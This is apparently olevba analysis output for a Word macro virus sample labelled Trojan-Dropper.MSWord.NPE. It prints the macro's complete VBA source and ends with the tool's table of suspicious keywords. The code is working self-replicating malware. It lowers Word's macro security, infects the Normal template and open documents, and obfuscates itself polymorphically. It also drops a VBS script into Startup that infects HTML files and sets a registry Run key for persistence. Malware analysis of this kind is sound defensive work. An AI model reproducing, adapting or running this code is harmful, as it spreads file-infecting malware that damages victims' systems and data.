olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSWord.NPE-203ad6df42f2f3e7d0e935a6cb4986c79de48dab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-Dropper.MSWord.NPE-203ad6df42f2f3e7d0e935a6cb4986c79de48dab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_close()
On Error Resume Next
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Set AD = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
Start_line = ThisDoc.ProcStartLine("document_close", vbext_pk_Proc)
If AD.CountOfLines <> 0 Then
Ad_Lines = AD.Lines(Start_line, AD.CountOfLines)
If InStr(Ad_Lines, TD.Lines(Start_line, 89)) = 0 Then
AD.AddFromString TD.Lines(Start_line, 89)
End If
Else
AD.AddFromString TD.Lines(Start_line, 89)
End If
If NT.CountOfLines <> 0 Then
Nt_lines = NT.Lines(Start_line, NT.CountOfLines)
If InStr(Nt_lines, TD.Lines(Start_line, 89)) = 0 Then
NT.AddFromString TD.Lines(Start_line, 89)
End If
Else
NT.AddFromString TD.Lines(Start_line, 89)
OurCode = NPE(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
          ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines))
End If
'VBS.Camel by DX100h
Open "c:\windows\startm~1\progra~1\autost~1\readme.txt.vbs" For Output As #1
Print #1, "On Error Resume Next"
Print #1, "rem VBS.Camel by DX100h"
Print #1, "Dim FSO, WSShell, c, cmlcty"
Print #1, "Set FSO = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "Set c = FSO.CreateTextFile(""c:\windows\system\cmlcty.vbs"")"
Print #1, "c.writeline ""On Error Resume Next"""
Print #1, "c.writeline ""Dim FSO, Fobj, ALL, Exten, Tutto, vir, virus"
Print #1, "c.writeline ""Set FSO = CreateObject(" + Chr(34) + "Scripting.FileSystemObject" + Chr(34) + ")"
Print #1, "c.writeline ""Set Fobj = FSO.GetFolder(" + Chr(34) + "c:\windows\desktop" + Chr(34) + ")"
Print #1, "c.writeline ""Set ALL = Fobj.Files"
Print #1, "c.writeline ""For Each Target in ALL"
Print #1, "c.writeline ""Exten = lcase(FSO.GetExtensionName(target.Name))"
Print #1, "c.writeline ""If Exten = " + Chr(34) + "HTM" + Chr(34) + " or Exten = " + Chr(34) + "HTML" + Chr(34) + " Then"
Print #1, "c.writeline ""Set Tutto = FSO.OpenTextFile(target.path, 1, False)"
Print #1, "c.writeline ""If Tutto.ReadLine <> " + Chr(34) + "<cmlcty.sys>" + Chr(34) + " Then"
Print #1, "c.writeline ""Tutto.Close"
Print #1, "c.writeline ""GetFile(target.path)"
Print #1, "c.writeline ""Else"
Print #1, "c.writeline ""Tutto.Close"
Print #1, "c.writeline ""End If"
Print #1, "c.writeline ""End If"
Print #1, "c.writeline ""Next"
Print #1, "c.writeline ""Sub GetFile(GetFileName)"
Print #1, "c.writeline ""Set vir = FSO.OpenTextFile(" + Chr(34) + "C:\windows\system\cmlcty32.sys" + Chr(34) + ",1,false)"
Print #1, "c.writeline ""virus = vir.ReadAll()"
Print #1, "c.writeline ""vir.Close"
Print #1, "c.writeline ""Set Victim = FSO.OpenTextFile(GetFileName, 1, False)"
Print #1, "c.writeline ""Contenuto = Victim.ReadAll()"
Print #1, "c.writeline ""Set Victim = FSO.OpenTextFile(GetFileName, 2, False)"
Print #1, "c.writeline ""Victim.WriteLine " + Chr(34) + "<cmlcty.sys>" + Chr(34)
Print #1, "c.writeline ""Victim.Write(virus)"
Print #1, "c.writeline ""Victim.WriteLine " + Chr(34) + " " + Chr(34)
Print #1, "c.writeline ""Victim.Write(Contenuto)"
Print #1, "c.writeline ""Victim.Close"
Print #1, "c.writeline ""End Sub"
Print #1, "Set ws = CreateObject(""WScript.Shell"")"
Print #1, "camel = Wscript.ScriptFullName"
Print #1, "If Not (FSO.FileExists(""c:\windows\desktop\cmlcty32.sys"")) Then"
Print #1, "ws.regwrite ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Cml"", "" wscript.exe c:\windows\system\cmlcty.vbs %"
Print #1, "FSO.CopyFile (camel), ""c:\windows\system\cmlcty32.sys"
Print #1, "End If"
Close #1
'Camel
'(c)by DX100h & Necronomikon[Zer0Gravity]
End Sub
Private Function NPE(poly)
Dim VaR(6): On Error Resume Next: Randomize
VaR(1) = "poly": VaR(2) = "NPE": VaR(3) = "VaR": VaR(4) = "nec"
VaR(5) = "morph": VaR(6) = "NewVar"
For nec = 1 To 6
nec_nec = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr( _
          Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int( _
          Rnd * 25) + 65)
While InStr(1, poly, VaR(nec), vbTextCompare)
      morph = InStr(1, poly, VaR(nec), vbTextCompare)
      poly = Mid(poly, 1, morph - 1) & NewVar & Mid( _
                  poly, morph + Len(VaR(nec)), Len(poly) _
                  - morph)
Wend
Next
NPE = poly
End Function


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |txt.vbs             |Executable file name                         |
|IOC       |cmlcty.vbs          |Executable file name                         |
|IOC       |wscript.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

